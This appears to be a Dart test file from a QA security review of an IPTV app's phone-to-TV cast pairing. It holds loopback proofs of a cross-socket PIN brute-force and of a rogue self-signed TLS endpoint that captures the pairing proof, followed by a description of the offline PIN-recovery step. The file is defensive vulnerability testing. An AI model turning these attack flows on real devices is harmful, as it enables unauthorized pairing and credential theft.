// QA SECURITY (matrix AC1 / AC2 / AC5b) — headless, protocol-level proofs.
//
// These exercise the REAL pairing code paths of TvReceiverService (receiver)
// and PhoneSenderService (sender) over an in-process wss/ws channel — the same
// code that runs on device. No emulator needed: the security properties under
// test live entirely in the pairing state machine and the proof/cert-pinning
// logic, so a loopback socket is a faithful and deterministic harness.
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:rensi_iptv/services/cast/cast_protocol.dart';
import 'package:rensi_iptv/services/cast/cast_tls.dart';
import 'package:rensi_iptv/services/cast/phone_sender_service.dart';
import 'package:rensi_iptv/services/cast/tv_receiver_service.dart';

String _redact(String b64) {
  if (b64.length <= 8) return '***';
  return '${b64.substring(0, 4)}…${b64.substring(b64.length - 4)} (len=${b64.length})';
}

void main() {
  // ── AC1 ───────────────────────────────────────────────────────────────────
  // PIN lockout per socket: 3 wrong PINs on ONE socket → the receiver closes
  // the socket at the 3rd (tv_receiver_service.dart:251). Must NOT close before.
  test('AC1 — PIN lockout closes the socket at exactly 3 wrong attempts', () async {
    final receiver = TvReceiverService(deviceName: 'TV', pin: '123456');
    final port = await receiver.start(advertise: false);

    final sender = PhoneSenderService();
    var disconnected = false;
    sender.onDisconnected = () => disconnected = true;
    await sender.connect('127.0.0.1', port); // ws:// plain (no TLS): certfp empty

    // Attempt 1
    expect(await sender.pair('000000'), isFalse, reason: 'wrong PIN #1 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 120));
    expect(disconnected, isFalse, reason: 'socket still open after 1 fail');

    // Attempt 2
    expect(await sender.pair('111111'), isFalse, reason: 'wrong PIN #2 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 120));
    expect(disconnected, isFalse, reason: 'socket still open after 2 fails');

    // Attempt 3 → receiver sends too_many_attempts + closes the socket.
    expect(await sender.pair('222222'), isFalse, reason: 'wrong PIN #3 rejected');
    await Future<void>.delayed(const Duration(milliseconds: 200));
    expect(disconnected, isTrue,
        reason: 'AC1: socket MUST be closed at the 3rd failed attempt');

    await sender.close();
    await receiver.stop();
    receiver.dispose();
    // ignore: avoid_print
    print('AC1 PASS: socket open after 1 & 2 fails, closed at 3rd.');
  }, timeout: const Timeout(Duration(seconds: 20)));

  // ── AC2 ───────────────────────────────────────────────────────────────────
  // Cross-socket brute-force (KNOWN weakness). The attempt counter is a local
  // var per socket; the PIN is fixed for the receiver instance; there is no
  // global rate-limit. So an attacker reconnects after each 3-fail lockout and
  // keeps guessing indefinitely — the 6-digit space is enumerable. We prove the
  // VECTOR reproduces with a few reconnect cycles (we do NOT actually brute the
  // 10^6 space): after N lockout cycles the correct PIN STILL pairs, and each
  // fresh socket accepts a fresh round of 3 attempts.
  test('AC2 — reconnect resets the counter; PIN unchanged; no global limit → enumerable',
      () async {
    final receiver = TvReceiverService(deviceName: 'TV', pin: '424242');
    final port = await receiver.start(advertise: false);

    const cycles = 5; // 5 sockets × 3 = 15 guesses, no throttle whatsoever
    var totalGuesses = 0;
    for (var c = 0; c < cycles; c++) {
      final s = PhoneSenderService();
      var closed = false;
      s.onDisconnected = () => closed = true;
      await s.connect('127.0.0.1', port);
      // Burn the 3 allowed guesses on this socket with WRONG pins.
      for (var i = 0; i < 3; i++) {
        expect(await s.pair('000000'), isFalse);
        totalGuesses++;
      }
      await Future<void>.delayed(const Duration(milliseconds: 150));
      expect(closed, isTrue,
          reason: 'each socket locks out after 3 — then attacker just reconnects');
      await s.close();
    }

    // After 15 failed guesses across 5 lockouts, the PIN has NOT rotated and is
    // NOT globally blocked: a brand-new socket pairs with the correct PIN.
    final good = PhoneSenderService();
    await good.connect('127.0.0.1', port);
    expect(await good.pair('424242'), isTrue,
        reason: 'AC2 CONFIRMED-VULN: PIN unchanged & no global lockout after '
            '$totalGuesses failed guesses → 6-digit space is enumerable');
    await good.close();

    await receiver.stop();
    receiver.dispose();
    // ignore: avoid_print
    print('AC2 CONFIRMED-VULN: $totalGuesses wrong guesses across $cycles '
        'reconnects, no throttle; correct PIN still accepted afterwards.');
  }, timeout: const Timeout(Duration(seconds: 30)));

  // ── AC5b ──────────────────────────────────────────────────────────────────
  // MITM terminator = the credential-theft vector. The sender's "anti-MITM"
  // check (phone_sender_service.dart:155) compares the captured TLS fingerprint
  // against the certfp the SERVER advertised in its own pair_challenge. An
  // attacker that terminates the wss with its OWN self-signed cert simply
  // advertises certfp = sha256(its own cert): the check passes vacuously
  // (_capturedFp == _certfp, both the attacker's), and the phone SENDS the
  // proof = HMAC(HKDF(PIN,salt), nonce‖attackerCertfp). A passive holder of
  // {salt, nonce, certfp, proof} can then offline-dictionary the 6-digit PIN.
  //
  // We stand up a rogue wss endpoint (its own cert, does NOT know the PIN),
  // point the sender at it (the debug host/port path), and CAPTURE the proof
  // the phone sends. Proving the phone emits the proof to the attacker IS the
  // vuln — we do not need to actually crack the PIN.
  test('AC5b — rogue wss terminator receives the pairing proof (offline-dictionary vector)',
      () async {
    // Attacker's OWN TLS identity (unrelated to any legit TV).
    final rogueTls = CastTls.generate();
    final rogueCertfp = base64.encode(rogueTls.fingerprint);
    final salt = base64.encode(List<int>.generate(16, (i) => i));
    final nonce = base64.encode(List<int>.generate(16, (i) => 255 - i));

    final ctx = SecurityContext(withTrustedRoots: false)
      ..useCertificateChainBytes(rogueTls.certPem.codeUnits)
      ..usePrivateKeyBytes(rogueTls.keyPem.codeUnits);
    final server =
        await HttpServer.bindSecure(InternetAddress.loopbackIPv4, 0, ctx);

    final proofReceived = Completer<Map<String, dynamic>>();
    server.listen((HttpRequest req) async {
      if (!WebSocketTransformer.isUpgradeRequest(req)) {
        req.response.statusCode = HttpStatus.forbidden;
        await req.response.close();
        return;
      }
      final ws = await WebSocketTransformer.upgrade(req);
      // The rogue TV advertises ITS OWN certfp — the whole trick.
      ws.add(encodeMsg(MsgType.pairChallenge, {
        'salt': salt,
        'nonce': nonce,
        'device': 'TotallyLegitTV',
        'tvId': 'rogue-1',
        'certfp': rogueCertfp,
      }));
      ws.listen((data) {
        final msg = decodeMsg(data as String);
        if (msg['t'] == MsgType.pairProof && !proofReceived.isCompleted) {
          proofReceived.complete(msg);
        }
      });
    });

    // Victim phone connects to the attacker (as it would via debug-connect or a
    // spoofed mDNS record) and tries to pair with its real PIN.
    final phone = PhoneSenderService();
    await phone.connect('127.0.0.1', server.port, secure: true);
    final pairFut = phone.pair('654321'); // the phone's real 6-digit PIN

    // THE ASSERTION: the phone did NOT abort — it sent the proof to the rogue.
    final captured = await proofReceived.future
        .timeout(const Duration(seconds: 5), onTimeout: () => {});
    expect(captured['t'], MsgType.pairProof,
        reason: 'AC5b CONFIRMED-VULN: phone sent the pairing proof to a rogue '
            'cert-terminating endpoint (the anti-MITM check is self-asserted).');
    final capturedProof = captured['proof'] as String;
    expect(capturedProof, isNotNull);

    // ignore: avoid_print
    print('AC5b CONFIRMED-VULN — attacker captured, over the wire, everything '
        'needed for an offline 6-digit-PIN dictionary attack:');
    // ignore: avoid_print
    print('   salt      = ${_redact(salt)}');
    // ignore: avoid_print
    print('   nonce     = ${_redact(nonce)}');
    // ignore: avoid_print
    print('   certfp    = ${_redact(rogueCertfp)}  (attacker-controlled)');
    // ignore: avoid_print
    print('   PROOF     = ${_redact(capturedProof)}  = HMAC(HKDF(PIN,salt), nonce‖certfp)');
    // ignore: avoid_print
    print('   => for pin in 000000..999999: HMAC matches => PIN recovered offline.');

    // Let the pair() future settle (rogue never sends pair_result → times out).
    await pairFut.timeout(const Duration(seconds: 6), onTimeout: () => false);
    await phone.close();
    await server.close(force: true);
  }, timeout: const Timeout(Duration(seconds: 25)));
}
